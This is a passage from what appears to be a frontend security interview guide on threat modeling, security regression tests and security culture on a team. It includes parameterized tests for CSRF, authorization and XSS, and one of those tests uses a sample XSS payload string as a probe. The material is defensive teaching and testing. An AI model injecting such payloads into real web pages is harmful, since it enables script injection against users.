Recall the earlier Insecure Design discussion: a flaw identified at this stage is a design conversation (cheap); the same flaw discovered after implementation is a rework (expensive); discovered in production is an incident (expensive and reputationally costly). The entire value of threat-modeling early is capturing issues at the cheapest possible point in the process.

Keeping it lightweight and actually happening

A heavyweight formal threat-modeling framework applied to every small feature will get skipped under deadline pressure. Reserve deeper, more formal exercises for genuinely high-stakes features (payments, auth, anything touching regulated data) and use the fast, five-question version above as the default for ordinary feature work — consistency of a lightweight practice beats sporadic application of a heavyweight one.

Code Example

// A concrete worked example -- design review notes for a new
// "share this report via link" feature, using the five-question structure:

// 1. Actors: report owner (intended), anyone who receives the link
//    (intended viewer), anyone who GUESSES or finds a leaked link
//    (unintended/adversarial actor).
// 2. Inputs: report ID, generated share token.
// 3. What if unexpected: token is guessable (sequential IDs?), link
//    never expires, link isn't revocable once shared.
// 4. Worst plausible outcome: a leaked/guessed link exposes a report
//    indefinitely, with no way to cut off access after the fact.
// 5. Does the design answer this? Initial draft: NO -- no expiry or
//    revocation was in the original design. -> ADD: unguessable token
//    (crypto.randomUUID(), not a sequential ID), explicit TTL, and a
//    revoke action, as part of THIS feature's v1, not a "later" ticket.

async function createShareLink(reportId) {
  const token = crypto.randomUUID();               // unguessable
  await api.createShareToken(reportId, token, { ttl: "7d" }); // expires
  return `https://app.example.com/shared/${reportId}?token=${token}`;
}
// revokeShareLink(reportId, token) shipped in the SAME PR, not deferred.

Project Example

During design review for a new "invite a teammate" feature, walking through the five-question structure surfaced that the initial design generated invite links using a predictable, incrementing identifier — nobody had asked "what if someone guesses a nearby invite link" until the threat-modeling step explicitly prompted it. Switching to an unguessable random token before any code was written cost roughly ten minutes of design discussion, compared to what would have been a meaningfully more expensive fix (a breaking API change plus notifying anyone who'd used the old link format) had it been caught only after launch.

Senior Engineer Perspective

This question tests whether a candidate can actually run a threat-modeling conversation, not just recite that "threat modeling is important." A strong answer walks through a concrete example end-to-end (as above) rather than staying abstract, and explicitly justifies keeping the process lightweight for ordinary features — showing awareness that a process too heavy to actually get used consistently provides less real security value than a lighter one that reliably happens on every feature.

Q95. How do you build security regression tests so a fixed vulnerability never silently reappears?

ROI: ★★★★ Frequency: Medium

Short Answer

Every real vulnerability finding — whether from a pen-test, a bug bounty report, or an internal review — should produce two things: a fix, and an automated test that fails if the fix is ever reverted or the underlying gap reopens through a different code path. Without the second part, a refactor six months later can silently reintroduce the exact issue, since nothing in the normal test suite would ever catch it; the vulnerability becomes a recurring cost instead of a closed chapter.

Detailed Answer

What makes a good security regression test

It should test the actual security property, not just the specific code path that happened to be buggy — e.g. rather than testing "this one specific endpoint rejects a missing CSRF token," consider a parameterized test running the same assertion across every mutating endpoint, so a new endpoint added later inherits the coverage automatically rather than needing someone to remember to add a bespoke test for it too.

Categories worth systematically covering, tying back to this chapter

  • Header presence (CSP, HSTS, framing headers) across every known route — shown earlier in the clickjacking-testing and misconfiguration questions.
  • CSRF protection — every mutating endpoint rejects a request missing the expected token/header, run as a parameterized test across the route table.
  • Authorization — a lower-privilege test user cannot access another user's resource by ID, and cannot reach admin-only endpoints; run for every resource type, not just the one where a gap was originally found.
  • Sanitization — a known XSS payload string, run through every user-content rendering path, asserting it never appears unescaped in the resulting output.
  • Error response shape — asserting error responses never contain a stack trace or internal identifier pattern in a production-mode test run.

Making this a standing practice, not a one-off

Add "did we add a regression test for this" as a required step in your incident/finding remediation process, the same way a correctness bug fix is expected to come with a test. Over time, this builds a security-specific regression suite that grows in exact proportion to your team's actual, historically-relevant risk — arguably more valuable per test than a generic, off-the-shelf security test suite, because it's calibrated to issues your specific codebase has actually had.

Code Example

// Parameterized across EVERY mutating route, not just the one originally found buggy --
// new routes inherit the coverage automatically.
const MUTATING_ROUTES = [
  { method: "post", path: "/api/account/email" },
  { method: "post", path: "/api/payments" },
  { method: "delete", path: "/api/account" },
  // ... every current mutating endpoint
];

test.each(MUTATING_ROUTES)("rejects %o without CSRF token", async ({ method, path }) => {
  const res = await request(app)[method](path).send({});
  expect(res.status).toBe(403);
});

// A sanitization regression test run against every known user-content
// rendering path, using a real XSS payload string as the probe:
const XSS_PROBE = '<img src=x onerror=window.__xssFired=true>';
test.each(["comment", "profileBio", "reportName"])(
  "%s field never renders unescaped XSS payload",
  async (field) => {
    render(<CommentView comment={{ [field]: XSS_PROBE }} />);
    expect(document.body.innerHTML).not.toContain("onerror=");
  }
);

// Authorization regression: a non-owner cannot fetch another user's resource.
test("cannot fetch another user's invoice by ID", async () => {
  const res = await request(app)
    .get(`/api/invoices/${otherUsersInvoiceId}`)
    .set("Authorization", `Bearer ${lowPrivilegeUserToken}`);
  expect(res.status).toBe(403);
});

Project Example

After a pen-test found that one specific endpoint was missing a CSRF check, the team's initial fix added the check to that one route only, with a single test covering it. Six months later, a routine refactor extracted a shared handler pattern and, in the process, a different new mutating endpoint was added without the CSRF middleware applied — invisible to the existing single-endpoint test, and undiscovered until a follow-up assessment found it. The team then rebuilt the test as a parameterized check across the entire route table (as shown above), so any future new mutating endpoint would need to be deliberately excluded (a visible, reviewable decision) rather than silently falling outside coverage by default.

Senior Engineer Perspective

The senior distinction worth making explicit: a regression test scoped to the exact original bug only protects against that literal code path regressing; a regression test scoped to the underlying security property, applied broadly (every route, every content field, every resource type), protects against the same class of issue reappearing anywhere, including in code that doesn't exist yet. Treating "add a broad, property-based regression test" as a standard part of remediating any finding — not just "fix the one instance" — is exactly the habit that compounds into a genuinely hardened codebase over time rather than a series of one-off patches.

Q96. How do you build a security-conscious engineering culture on a frontend team without turning every PR into a bottleneck?

ROI: ★★★★ Frequency: Medium

Short Answer

The sustainable answer is layering fast, automated checks (linting, SAST, secret/dependency scanning, header/CSRF regression tests — all covered in this section) to catch the mechanically-detectable issues without any human bottleneck, reserving human review attention for the smaller set of genuinely judgment-dependent questions (does this specific data flow matter, is this business-logic authorization correct, is this design sound). Pair that with lightweight, consistently-applied practices (the short PR checklist, the five-question threat-modeling structure) rather than heavyweight processes that get skipped under deadline pressure — and treat every real finding as an opportunity to add a permanent, automated safeguard rather than a one-off fix, so the team's collective security posture compounds over time instead of resetting after every incident.

Detailed Answer

Why "more review" isn't the actual answer

A common but ultimately counterproductive instinct after a security incident is to add more mandatory manual review steps — which slows down every PR, including the overwhelming majority that have nothing to do with the specific risk that motivated the change, and predictably erodes over time as deadline pressure makes people skip or rubber-stamp an increasingly bureaucratic gate. The durable fix targets the actual mechanism (automated tooling for detectable patterns, plus a habit — not a mandatory heavyweight gate — for the judgment-dependent parts).

What this looks like assembled together, drawing on the whole section

  • Fast, automated layers (linting, SAST, secret scanning, dependency scanning) run on every PR with no human bottleneck, catching the majority of mechanically-detectable issues (Q93).
  • A short, memorable PR checklist for the judgment-dependent items that tooling can't fully cover (Q89, Q90) — kept deliberately brief so it's actually followed.
  • Lightweight threat-modeling as a normal part of design discussion for new features, not a separate mandatory gate (Q94).
  • Every real finding converts into a permanent, automated regression test (Q95), so the team's coverage compounds rather than resets.
  • Elevated scrutiny reserved specifically for the higher-stakes categories (new dependencies, third-party embeds, auth/token changes — Q91, Q92) rather than applying uniform heavy scrutiny to every change regardless of actual risk.

The cultural component

Beyond process and tooling, the habit of pattern-recognition during ordinary code review (Q90) — every engineer, not just a designated "security person," spotting a red flag inline — scales far better than centralizing all security judgment in a single reviewer or a periodic audit, precisely because it catches issues at the point they're introduced, by the people most familiar with the change's actual intent and context.
